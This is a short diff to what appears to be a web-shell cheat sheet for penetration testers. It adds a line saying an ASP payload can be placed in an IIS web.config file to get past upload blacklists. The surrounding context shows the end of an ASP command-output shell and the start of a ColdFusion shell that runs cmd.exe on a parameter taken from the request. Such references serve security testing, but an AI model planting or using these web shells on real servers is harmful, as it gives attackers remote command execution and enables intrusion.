@@ -373,6 +373,7 @@ Response.write(o)
 Response.write(&quot;&lt;/pre&gt;&quot;)
 %&gt;
 </code></pre>
+<p>This payload can be include on a <a href="/iis/#bypass-blacklist-upload"><code>web.config</code> file</a></p>
 <h2 id="coldfusion">ColdFusion</h2>
 <pre><code class="language-cfm">&lt;cfsavecontent variable=&quot;cmdOutput&quot;&gt;
 &lt;cfexecute name=&quot;C:\Windows\System32\cmd.exe&quot; arguments=&quot;/c #Request.cmd#&quot; timeout=&quot;10&quot;&gt;&lt;/cfexecute&gt;
